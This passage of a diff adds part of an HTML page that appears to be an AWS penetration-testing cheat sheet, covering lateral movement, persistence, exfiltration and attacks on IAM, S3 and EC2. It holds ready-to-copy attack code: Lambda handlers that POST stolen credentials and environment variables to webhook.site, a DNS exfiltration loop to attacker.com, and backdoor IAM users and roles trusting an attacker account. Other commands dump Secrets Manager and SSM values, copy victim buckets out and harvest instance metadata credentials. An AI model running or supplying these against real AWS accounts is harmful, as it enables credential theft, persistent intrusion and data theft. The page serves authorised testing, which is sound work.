+  <span class="t-flag">--parameters</span> <span class="t-val">'{"commands":["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/","env | grep AWS"]}'</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'Command.CommandId'</span> \
+  <span class="t-flag">--output</span> text
+
+<span class="t-cmt"># Retrieve command output</span>
+<span class="t-cmd">aws ssm get-command-invocation</span> \
+  <span class="t-flag">--command-id</span> <span class="t-val">&lt;command-id&gt;</span> \
+  <span class="t-flag">--instance-id</span> <span class="t-val">i-0abc123...</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'StandardOutputContent'</span></pre></div>
+    </div>
+
+    <h3>Lambda Pivoting — Environment Variable Theft</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Get Lambda function config — check environment variables for secrets</span>
+<span class="t-cmd">aws lambda get-function-configuration</span> <span class="t-flag">--function-name</span> <span class="t-val">&lt;function-name&gt;</span>
+<span class="t-cmd">aws lambda get-function-configuration</span> <span class="t-flag">--function-name</span> <span class="t-val">&lt;function-name&gt;</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'Environment.Variables'</span>
+
+<span class="t-cmt"># Update Lambda code to exfiltrate credentials and env vars</span>
+<span class="t-cmd">cat</span> > /tmp/exfil.py &lt;&lt; <span class="t-val">'EOF'</span>
+import boto3, os, urllib.request, json
+
+def handler(event, context):
+    creds = boto3.Session().get_credentials().get_frozen_credentials()
+    env = dict(os.environ)
+    data = {
+        'AccessKeyId': creds.access_key,
+        'SecretAccessKey': creds.secret_key,
+        'SessionToken': creds.token,
+        'Environment': env
+    }
+    req = urllib.request.Request(
+        'https://webhook.site/YOUR-UUID',
+        data=json.dumps(data).encode(),
+        method='POST',
+        headers={'Content-Type': 'application/json'}
+    )
+    urllib.request.urlopen(req)
+    return {'statusCode': 200}
+<span class="t-val">EOF</span>
+<span class="t-cmd">cd</span> /tmp && <span class="t-cmd">zip</span> exfil.zip exfil.py
+
+<span class="t-cmt"># Update existing function with exfil code</span>
+<span class="t-cmd">aws lambda update-function-code</span> \
+  <span class="t-flag">--function-name</span> <span class="t-val">TargetFunction</span> \
+  <span class="t-flag">--zip-file</span> <span class="t-val">fileb:///tmp/exfil.zip</span>
+
+<span class="t-cmt"># Invoke to trigger exfiltration</span>
+<span class="t-cmd">aws lambda invoke</span> \
+  <span class="t-flag">--function-name</span> <span class="t-val">TargetFunction</span> \
+  <span class="t-flag">--payload</span> <span class="t-val">'{}'</span> /tmp/out.json</pre></div>
+    </div>
+
+    <h3>Container &amp; ECS Lateral Movement</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Discover ECS tasks and their IAM roles</span>
+<span class="t-cmd">aws ecs list-clusters</span>
+<span class="t-cmd">aws ecs list-tasks</span> <span class="t-flag">--cluster</span> <span class="t-val">&lt;cluster-arn&gt;</span>
+<span class="t-cmd">aws ecs describe-tasks</span> \
+  <span class="t-flag">--cluster</span> <span class="t-val">&lt;cluster-arn&gt;</span> \
+  <span class="t-flag">--tasks</span> <span class="t-val">&lt;task-arn&gt;</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'tasks[].taskDefinitionArn'</span>
+
+<span class="t-cmt"># Get task definition to find role and secrets</span>
+<span class="t-cmd">aws ecs describe-task-definition</span> <span class="t-flag">--task-definition</span> <span class="t-val">&lt;task-def-arn&gt;</span>
+
+<span class="t-cmt"># ECR — look for supply chain targets</span>
+<span class="t-cmd">aws ecr describe-repositories</span>
+<span class="t-cmd">aws ecr list-images</span> <span class="t-flag">--repository-name</span> <span class="t-val">&lt;repo&gt;</span>
+<span class="t-cmd">aws ecr get-login-password</span> | <span class="t-cmd">docker login</span> <span class="t-flag">--username</span> AWS \
+  <span class="t-flag">--password-stdin</span> <span class="t-val">123456789012.dkr.ecr.us-east-1.amazonaws.com</span>
+
+<span class="t-cmt"># Pull image and inspect for embedded secrets</span>
+<span class="t-cmd">docker pull</span> <span class="t-val">123456789012.dkr.ecr.us-east-1.amazonaws.com/repo:latest</span>
+<span class="t-cmd">docker inspect</span> <span class="t-val">123456789012.dkr.ecr.us-east-1.amazonaws.com/repo:latest</span>
+<span class="t-cmd">docker run</span> <span class="t-flag">--rm -it</span> <span class="t-val">123456789012.dkr.ecr.us-east-1.amazonaws.com/repo:latest</span> <span class="t-cmd">env</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- PHASE 5: PERSISTENCE -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="phase5">
+    <div class="section-header">
+      <div class="phase-icon rs">🪝</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--rose)">Phase 05</div>
+        <h2>Persistence</h2>
+      </div>
+    </div>
+
+    <p>Once high-privilege access is obtained, document all persistence techniques for the engagement report. These methods maintain access even if initial credentials rotate or are revoked.</p>
+
+    <h3>IAM-Based Persistence</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Create a new IAM user with admin access</span>
+<span class="t-cmd">aws iam create-user</span> <span class="t-flag">--user-name</span> <span class="t-val">backdoor-user</span>
+<span class="t-cmd">aws iam attach-user-policy</span> \
+  <span class="t-flag">--user-name</span> <span class="t-val">backdoor-user</span> \
+  <span class="t-flag">--policy-arn</span> <span class="t-val">arn:aws:iam::aws:policy/AdministratorAccess</span>
+<span class="t-cmd">aws iam create-access-key</span> <span class="t-flag">--user-name</span> <span class="t-val">backdoor-user</span>
+
+<span class="t-cmt"># Create a backdoor role trusted by attacker-controlled account</span>
+<span class="t-cmd">aws iam create-role</span> \
+  <span class="t-flag">--role-name</span> <span class="t-val">BackdoorRole</span> \
+  <span class="t-flag">--assume-role-policy-document</span> <span class="t-val">'{
+    "Version": "2012-10-17",
+    "Statement": [{
+      "Effect": "Allow",
+      "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
+      "Action": "sts:AssumeRole"
+    }]
+  }'</span>
+<span class="t-cmd">aws iam attach-role-policy</span> \
+  <span class="t-flag">--role-name</span> <span class="t-val">BackdoorRole</span> \
+  <span class="t-flag">--policy-arn</span> <span class="t-val">arn:aws:iam::aws:policy/AdministratorAccess</span>
+
+<span class="t-cmt"># Create access key for an existing user</span>
+<span class="t-cmd">aws iam create-access-key</span> <span class="t-flag">--user-name</span> <span class="t-val">ExistingAdminUser</span>
+
+<span class="t-cmt"># Add SSH public key for EC2 access</span>
+<span class="t-cmd">aws ec2 import-key-pair</span> \
+  <span class="t-flag">--key-name</span> <span class="t-val">backdoor-key</span> \
+  <span class="t-flag">--public-key-material</span> <span class="t-val">fileb://~/.ssh/id_rsa.pub</span></pre></div>
+    </div>
+
+    <h3>Lambda Backdoor</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Add an external trigger to an existing Lambda (e.g., public URL)</span>
+<span class="t-cmd">aws lambda create-function-url-config</span> \
+  <span class="t-flag">--function-name</span> <span class="t-val">BackdoorFunction</span> \
+  <span class="t-flag">--auth-type</span> <span class="t-val">NONE</span>
+
+<span class="t-cmt"># Allow any principal to invoke the Lambda via resource-based policy</span>
+<span class="t-cmd">aws lambda add-permission</span> \
+  <span class="t-flag">--function-name</span> <span class="t-val">BackdoorFunction</span> \
+  <span class="t-flag">--statement-id</span> <span class="t-val">public-access</span> \
+  <span class="t-flag">--action</span> <span class="t-val">lambda:InvokeFunctionUrl</span> \
+  <span class="t-flag">--principal</span> <span class="t-val">'*'</span> \
+  <span class="t-flag">--function-url-auth-type</span> <span class="t-val">NONE</span></pre></div>
+    </div>
+
+    <h3>CloudFormation Drift Backdoor</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Modify a CloudFormation-managed resource out-of-band
+# (stack detects drift but doesn't auto-revert)
+# Example: Add backdoor rule to a security group managed by CFN</span>
+<span class="t-cmd">aws ec2 authorize-security-group-ingress</span> \
+  <span class="t-flag">--group-id</span> <span class="t-val">sg-0abc123</span> \
+  <span class="t-flag">--protocol</span> <span class="t-val">tcp</span> \
+  <span class="t-flag">--port</span> <span class="t-val">22</span> \
+  <span class="t-flag">--cidr</span> <span class="t-val">ATTACKER_IP/32</span>
+
+<span class="t-cmt"># Check if drift detection would catch it</span>
+<span class="t-cmd">aws cloudformation detect-stack-drift</span> <span class="t-flag">--stack-name</span> <span class="t-val">&lt;stack-name&gt;</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- PHASE 6: EXFILTRATION -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="phase6">
+    <div class="section-header">
+      <div class="phase-icon g">📤</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--green)">Phase 06</div>
+        <h2>Data Exfiltration</h2>
+      </div>
+    </div>
+
+    <p>Exfiltration objectives vary by engagement — common targets include IAM credentials, Secrets Manager values, S3 data, and database contents. Choose your exfiltration channel based on what's available in the target environment.</p>
+
+    <h3>Credential Exfiltration Methods</h3>
+
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Method</th><th>Best For</th><th>Tool</th></tr></thead>
+        <tbody>
+          <tr><td><strong>HTTP POST</strong> to webhook.site</td><td>Lambda, EC2 with outbound HTTP</td><td><code>requests</code> / <code>urllib</code></td></tr>
+          <tr><td><strong>DNS Exfiltration</strong></td><td>Restricted outbound, only DNS allowed</td><td><code>dnscat2</code>, manual base64+nslookup</td></tr>
+          <tr><td><strong>S3 bucket upload</strong></td><td>When S3 write access is available</td><td><code>aws s3 cp</code></td></tr>
+          <tr><td><strong>SNS / SQS</strong></td><td>Internal AWS messaging available</td><td><code>aws sns publish</code></td></tr>
+          <tr><td><strong>CloudWatch Logs</strong></td><td>Logging permitted</td><td><code>aws logs put-log-events</code></td></tr>
+          <tr><td><strong>SSM Parameter Store</strong></td><td>Write access to SSM</td><td><code>aws ssm put-parameter</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>Secrets Manager Exfiltration</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List all secrets</span>
+<span class="t-cmd">aws secretsmanager list-secrets</span>
+
+<span class="t-cmt"># Get specific secret value</span>
+<span class="t-cmd">aws secretsmanager get-secret-value</span> <span class="t-flag">--secret-id</span> <span class="t-val">MySecretName</span>
+<span class="t-cmd">aws secretsmanager get-secret-value</span> <span class="t-flag">--secret-id</span> <span class="t-val">arn:aws:secretsmanager:...</span>
+
+<span class="t-cmt"># Dump all accessible secrets in a loop</span>
+<span class="t-cmd">aws secretsmanager list-secrets</span> <span class="t-flag">--query</span> <span class="t-val">'SecretList[].Name'</span> <span class="t-flag">--output</span> text | \
+  <span class="t-cmd">tr</span> '\t' '\n' | <span class="t-key">while</span> read secret; <span class="t-key">do</span>
+    echo <span class="t-val">"=== $secret ==="</span>
+    <span class="t-cmd">aws secretsmanager get-secret-value</span> <span class="t-flag">--secret-id</span> <span class="t-val">"$secret"</span> 2>/dev/null
+    echo
+  <span class="t-key">done</span>
+
+<span class="t-cmt"># SSM Parameter Store — often contains RDS passwords, API keys</span>
+<span class="t-cmd">aws ssm get-parameters-by-path</span> \
+  <span class="t-flag">--path</span> <span class="t-val">/</span> \
+  <span class="t-flag">--recursive</span> \
+  <span class="t-flag">--with-decryption</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'Parameters[].[Name,Value]'</span> \
+  <span class="t-flag">--output</span> table</pre></div>
+    </div>
+
+    <h3>Webhook-Based Credential Exfiltration (Lambda/Python)</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label py">python</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Lambda handler that exfiltrates all available credentials</span>
+import boto3, os, urllib.request, json, socket
+
+def handler(event, context):
+    session = boto3.session.Session()
+    creds = session.get_credentials().get_frozen_credentials()
+
+    payload = {
+        <span class="t-val">'access_key'</span>:    creds.access_key,
+        <span class="t-val">'secret_key'</span>:    creds.secret_key,
+        <span class="t-val">'session_token'</span>: creds.token,
+        <span class="t-val">'region'</span>:        session.region_name,
+        <span class="t-val">'env'</span>:           dict(os.environ),
+        <span class="t-val">'function_name'</span>: os.environ.get(<span class="t-val">'AWS_LAMBDA_FUNCTION_NAME'</span>),
+    }
+
+    req = urllib.request.Request(
+        <span class="t-val">'https://webhook.site/YOUR-UUID'</span>,
+        data=json.dumps(payload).encode(<span class="t-val">'utf-8'</span>),
+        method=<span class="t-val">'POST'</span>,
+        headers={<span class="t-val">'Content-Type'</span>: <span class="t-val">'application/json'</span>}
+    )
+    urllib.request.urlopen(req, timeout=5)
+
+    return {<span class="t-val">'statusCode'</span>: 200, <span class="t-val">'body'</span>: <span class="t-val">'ok'</span>}</pre></div>
+    </div>
+
+    <h3>DNS Exfiltration (when HTTP is blocked)</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Base64-encode and chunk credentials, exfil via DNS lookups</span>
+<span class="t-cmt"># (each DNS label max 63 chars, total name max 253 chars)</span>
+
+<span class="t-cmt"># On attacker-controlled DNS server, capture queries</span>
+<span class="t-cmt"># Set up NS record: attacker.com NS ns.attacker.com</span>
+<span class="t-cmt"># Listen: tcpdump -i eth0 port 53</span>
+
+<span class="t-cmt"># On victim (bash version)</span>
+<span class="t-var">SECRET</span>=<span class="t-val">"AKIAIOSFODNN7EXAMPLEKEY+abc123..."</span>
+<span class="t-var">ENCODED</span>=$(<span class="t-cmd">echo</span> -n <span class="t-val">"$SECRET"</span> | <span class="t-cmd">base64</span> | <span class="t-cmd">tr</span> '+/' '-_' | <span class="t-cmd">tr</span> -d '=')
+<span class="t-cmt"># Split into 40-char chunks and resolve as subdomains</span>
+<span class="t-var">i</span>=0
+<span class="t-key">while</span> [ <span class="t-val">-n</span> <span class="t-val">"$ENCODED"</span> ]; <span class="t-key">do</span>
+  <span class="t-var">CHUNK</span>=<span class="t-val">"${ENCODED:0:40}"</span>
+  <span class="t-var">ENCODED</span>=<span class="t-val">"${ENCODED:40}"</span>
+  <span class="t-cmd">nslookup</span> <span class="t-val">"$i-$CHUNK.attacker.com"</span> >/dev/null 2>&1
+  <span class="t-var">i</span>=$((<span class="t-var">$i</span> + 1))
+<span class="t-key">done</span></pre></div>
+    </div>
+
+    <h3>S3 Data Exfiltration</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># List bucket contents</span>
+<span class="t-cmd">aws s3 ls</span> <span class="t-val">s3://target-bucket</span> <span class="t-flag">--recursive</span>
+
+<span class="t-cmt"># Download everything</span>
+<span class="t-cmd">aws s3 sync</span> <span class="t-val">s3://target-bucket</span> <span class="t-val">./loot/target-bucket</span>
+
+<span class="t-cmt"># Look for specific file types (configs, keys, DBs)</span>
+<span class="t-cmd">aws s3 ls</span> <span class="t-val">s3://target-bucket</span> <span class="t-flag">--recursive</span> | <span class="t-cmd">grep</span> <span class="t-flag">-Ei</span> <span class="t-val">'\.env|\.pem|\.key|\.json|config|secret|password|credential'</span>
+
+<span class="t-cmt"># Read single file without downloading</span>
+<span class="t-cmd">aws s3 cp</span> <span class="t-val">s3://target-bucket/config/.env</span> <span class="t-val">-</span>
+
+<span class="t-cmt"># Check bucket ACL and policy for public access</span>
+<span class="t-cmd">aws s3api get-bucket-acl</span> <span class="t-flag">--bucket</span> <span class="t-val">target-bucket</span>
+<span class="t-cmd">aws s3api get-bucket-policy</span> <span class="t-flag">--bucket</span> <span class="t-val">target-bucket</span>
+
+<span class="t-cmt"># Copy to attacker-controlled bucket (cross-account exfil)</span>
+<span class="t-cmd">aws s3 sync</span> <span class="t-val">s3://victim-bucket</span> <span class="t-val">s3://attacker-bucket</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- IAM DEEP-DIVE -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="svc-iam">
+    <div class="section-header">
+      <div class="phase-icon v">🔐</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--violet-hi)">Service Attack</div>
+        <h2>IAM Deep-Dive</h2>
+      </div>
+    </div>
+
+    <h3>Policy Evaluation Logic</h3>
+    <div class="callout note">
+      <span class="callout-icon">🧠</span>
+      <p><strong>AWS Policy Evaluation Order:</strong>
+      1) Explicit DENY (always wins) →
+      2) Service Control Policy (SCP) →
+      3) Resource-based policy →
+      4) Identity-based policy →
+      5) Permission Boundary →
+      6) Session Policy.
+      The key insight for pentesting: resource-based policies can independently grant access, even if identity-based policies are restrictive.
+      </p>
+    </div>
+
+    <h3>Finding Interesting Permissions</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Get full effective permissions (expensive — use sparingly)</span>
+<span class="t-cmd">aws iam simulate-principal-policy</span> \
+  <span class="t-flag">--policy-source-arn</span> <span class="t-val">arn:aws:iam::123456789012:user/target-user</span> \
+  <span class="t-flag">--action-names</span> <span class="t-val">iam:CreatePolicyVersion iam:AttachUserPolicy sts:AssumeRole</span>
+
+<span class="t-cmt"># Check for wildcard permissions in policies</span>
+<span class="t-cmd">aws iam get-policy-version</span> \
+  <span class="t-flag">--policy-arn</span> <span class="t-val">&lt;arn&gt;</span> \
+  <span class="t-flag">--version-id</span> <span class="t-val">v1</span> | \
+  <span class="t-cmd">jq</span> <span class="t-val">'.PolicyVersion.Document.Statement[] | select(.Effect=="Allow" and (.Action|type == "string" and contains("*") or type == "array"))'</span>
+
+<span class="t-cmt"># Find all IAM access keys and their last usage</span>
+<span class="t-cmd">aws iam list-users</span> <span class="t-flag">--query</span> <span class="t-val">'Users[].UserName'</span> <span class="t-flag">--output</span> text | \
+  <span class="t-cmd">tr</span> '\t' '\n' | <span class="t-key">while</span> read user; <span class="t-key">do</span>
+    <span class="t-cmd">aws iam list-access-keys</span> <span class="t-flag">--user-name</span> $user
+  <span class="t-key">done</span>
+
+<span class="t-cmt"># Look for users with console access (passwords)</span>
+<span class="t-cmd">aws iam get-credential-report</span>
+<span class="t-cmd">aws iam generate-credential-report</span>
+<span class="t-cmt"># Wait, then:</span>
+<span class="t-cmd">aws iam get-credential-report</span> | <span class="t-cmd">jq</span> -r <span class="t-val">'.Content'</span> | <span class="t-cmd">base64</span> -d</pre></div>
+    </div>
+
+    <h3>Role Trust Policy Analysis</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Find roles with overly permissive trust policies (wildcard principals)</span>
+<span class="t-cmd">aws iam list-roles</span> | <span class="t-cmd">jq</span> <span class="t-val">'.Roles[] |
+  select(.AssumeRolePolicyDocument.Statement[] |
+    .Principal == "*" or
+    (.Principal.AWS? == "*") or
+    (.Condition? | not)
+  ) | {RoleName, Arn}'</span>
+
+<span class="t-cmt"># Find roles accessible via EC2 service (potential SSRF targets)</span>
+<span class="t-cmd">aws iam list-roles</span> | <span class="t-cmd">jq</span> -r <span class="t-val">'.Roles[] |
+  select(.AssumeRolePolicyDocument.Statement[].Principal.Service? == "ec2.amazonaws.com") |
+  .Arn'</span>
+
+<span class="t-cmt"># Find roles with ExternalId conditions (cross-account)</span>
+<span class="t-cmd">aws iam list-roles</span> | <span class="t-cmd">jq</span> <span class="t-val">'.Roles[] |
+  select(.AssumeRolePolicyDocument.Statement[].Condition.StringEquals."sts:ExternalId"?) |
+  {RoleName, ExternalId: .AssumeRolePolicyDocument.Statement[].Condition.StringEquals."sts:ExternalId"}'</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- S3 -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="svc-s3">
+    <div class="section-header">
+      <div class="phase-icon a">🪣</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--amber)">Service Attack</div>
+        <h2>S3 Attacks</h2>
+      </div>
+    </div>
+
+    <h3>Public Bucket Discovery</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Check if public access block is disabled</span>
+<span class="t-cmd">aws s3api get-public-access-block</span> <span class="t-flag">--bucket</span> <span class="t-val">&lt;bucket-name&gt;</span>
+
+<span class="t-cmt"># Check bucket policy for public statements</span>
+<span class="t-cmd">aws s3api get-bucket-policy</span> <span class="t-flag">--bucket</span> <span class="t-val">&lt;bucket-name&gt;</span> | \
+  <span class="t-cmd">jq</span> <span class="t-val">'.Policy | fromjson | .Statement[] | select(.Principal == "*")'</span>
+
+<span class="t-cmt"># Test anonymous access (no credentials)</span>
+<span class="t-cmd">aws s3 ls</span> <span class="t-val">s3://target-bucket</span> <span class="t-flag">--no-sign-request</span>
+<span class="t-cmd">curl</span> <span class="t-val">https://target-bucket.s3.amazonaws.com/</span>
+
+<span class="t-cmt"># Check cross-account bucket access (resource-based policy)</span>
+<span class="t-cmd">aws s3api get-bucket-policy-status</span> <span class="t-flag">--bucket</span> <span class="t-val">&lt;bucket-name&gt;</span></pre></div>
+    </div>
+
+    <h3>S3 Privilege Escalation via Bucket Policy</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># If you have s3:PutBucketPolicy, grant yourself cross-account access</span>
+<span class="t-cmd">aws s3api put-bucket-policy</span> \
+  <span class="t-flag">--bucket</span> <span class="t-val">target-bucket</span> \
+  <span class="t-flag">--policy</span> <span class="t-val">'{
+    "Version": "2012-10-17",
+    "Statement": [{
+      "Effect": "Allow",
+      "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
+      "Action": "s3:*",
+      "Resource": [
+        "arn:aws:s3:::target-bucket",
+        "arn:aws:s3:::target-bucket/*"
+      ]
+    }]
+  }'</span>
+
+<span class="t-cmt"># Enable server-side logging to your bucket (for exfil metadata)</span>
+<span class="t-cmd">aws s3api put-bucket-logging</span> \
+  <span class="t-flag">--bucket</span> <span class="t-val">target-bucket</span> \
+  <span class="t-flag">--bucket-logging-status</span> <span class="t-val">'{
+    "LoggingEnabled": {
+      "TargetBucket": "attacker-bucket",
+      "TargetPrefix": "logs/"
+    }
+  }'</span>
+
+<span class="t-cmt"># Check for S3 Object Lambda (code execution on read)</span>
+<span class="t-cmd">aws s3control list-access-points-for-object-lambda</span> <span class="t-flag">--account-id</span> <span class="t-val">&lt;account-id&gt;</span></pre></div>
+    </div>
+
+    <h3>Presigned URL Abuse</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Generate presigned URL valid for 7 days (share access without creds)</span>
+<span class="t-cmd">aws s3 presign</span> <span class="t-val">s3://target-bucket/sensitive-file.txt</span> <span class="t-flag">--expires-in</span> <span class="t-val">604800</span>
+
+<span class="t-cmt"># Presigned URL for upload (PUT)</span>
+<span class="t-cmd">aws s3 presign</span> <span class="t-val">s3://target-bucket/upload.txt</span> \
+  <span class="t-flag">--expires-in</span> <span class="t-val">3600</span></pre></div>
+    </div>
+  </div>
+
+  <!-- ──────────────────────────────────────────────────── -->
+  <!-- EC2 + IMDS -->
+  <!-- ──────────────────────────────────────────────────── -->
+  <div class="section" id="svc-ec2">
+    <div class="section-header">
+      <div class="phase-icon c">🖥️</div>
+      <div class="section-meta">
+        <div class="phase-label" style="color:var(--cyan)">Service Attack</div>
+        <h2>EC2 &amp; IMDS Attacks</h2>
+      </div>
+    </div>
+
+    <h3>IMDSv1 vs IMDSv2 — Critical Difference</h3>
+    <div class="callout danger">
+      <span class="callout-icon">🚨</span>
+      <p><strong>IMDSv1</strong> is unauthenticated — any SSRF vulnerability or process on the instance can retrieve credentials with a simple GET. <strong>IMDSv2</strong> requires a PUT request first to get a session token. Always check which version is enabled — IMDSv1 is the more dangerous configuration.</p>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Check IMDSv1 (if this works, SSRF → cred theft is trivial)</span>
+<span class="t-cmd">curl</span> http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+<span class="t-cmt"># IMDSv2 — get token first, then use it</span>
+<span class="t-var">TOKEN</span>=$(<span class="t-cmd">curl</span> <span class="t-flag">-s -X PUT</span> <span class="t-val">"http://169.254.169.254/latest/api/token"</span> \
+  <span class="t-flag">-H</span> <span class="t-val">"X-aws-ec2-metadata-token-ttl-seconds: 21600"</span>)
+<span class="t-cmd">curl</span> <span class="t-flag">-s</span> <span class="t-flag">-H</span> <span class="t-val">"X-aws-ec2-metadata-token: $TOKEN"</span> \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+<span class="t-cmt"># Full credential extraction via IMDS</span>
+<span class="t-var">ROLE_NAME</span>=$(<span class="t-cmd">curl</span> -s \
+  -H <span class="t-val">"X-aws-ec2-metadata-token: $TOKEN"</span> \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+
+<span class="t-cmd">curl</span> -s \
+  -H <span class="t-val">"X-aws-ec2-metadata-token: $TOKEN"</span> \
+  <span class="t-val">"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"</span>
+
+<span class="t-cmt"># Other useful IMDS endpoints</span>
+<span class="t-cmd">curl</span> -s http://169.254.169.254/latest/meta-data/                  <span class="t-cmt"># full listing</span>
+<span class="t-cmd">curl</span> -s http://169.254.169.254/latest/meta-data/instance-id
+<span class="t-cmd">curl</span> -s http://169.254.169.254/latest/meta-data/local-ipv4
+<span class="t-cmd">curl</span> -s http://169.254.169.254/latest/meta-data/public-ipv4
+<span class="t-cmd">curl</span> -s http://169.254.169.254/latest/user-data               <span class="t-cmt"># launch scripts often contain creds!</span>
+
+<span class="t-cmt"># Check IMDS version enforcement on instances</span>
+<span class="t-cmd">aws ec2 describe-instances</span> \
+  <span class="t-flag">--query</span> <span class="t-val">'Reservations[].Instances[].[InstanceId,MetadataOptions.HttpTokens,MetadataOptions.HttpEndpoint]'</span> \
+  <span class="t-flag">--output</span> table
+<span class="t-cmt"># HttpTokens=optional → IMDSv1 still enabled (vulnerable)
+# HttpTokens=required → IMDSv2 enforced (more secure)</span></pre></div>
+    </div>
+
+    <h3>EC2 User Data — Plaintext Secret Discovery</h3>
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label bash">bash</span>
+        <button class="copy-btn" onclick="copyBlock(this)">⎘ Copy</button>
+      </div>
+      <div class="cmd-body"><pre><span class="t-cmt"># Retrieve user data from all instances (may contain bootstrap secrets)</span>
+<span class="t-cmd">aws ec2 describe-instances</span> <span class="t-flag">--query</span> <span class="t-val">'Reservations[].Instances[].InstanceId'</span> <span class="t-flag">--output</span> text | \
+  <span class="t-cmd">tr</span> '\t' '\n' | <span class="t-key">while</span> read iid; <span class="t-key">do</span>
+    echo <span class="t-val">"=== $iid ==="</span>
+    <span class="t-cmd">aws ec2 describe-instance-attribute</span> <span class="t-flag">--instance-id</span> $iid <span class="t-flag">--attribute</span> userData \
+      <span class="t-flag">--query</span> <span class="t-val">'UserData.Value'</span> <span class="t-flag">--output</span> text 2>/dev/null | <span class="t-cmd">base64</span> -d 2>/dev/null
+    echo
+  <span class="t-key">done</span>
+
+<span class="t-cmt"># Enumerate security groups for unintended public exposure</span>
+<span class="t-cmd">aws ec2 describe-security-groups</span> | <span class="t-cmd">jq</span> <span class="t-val">'.SecurityGroups[] |
+  select(.IpPermissions[].IpRanges[].CidrIp == "0.0.0.0/0") |
+  {GroupId, GroupName, OpenPorts: [.IpPermissions[] |
+    select(.IpRanges[].CidrIp == "0.0.0.0/0") | .FromPort]}'</span></pre></div>
+    </div>
+
+    <h3>SSRF to IMDS — Web App Attack Chain</h3>
+    <div class="callout tip">
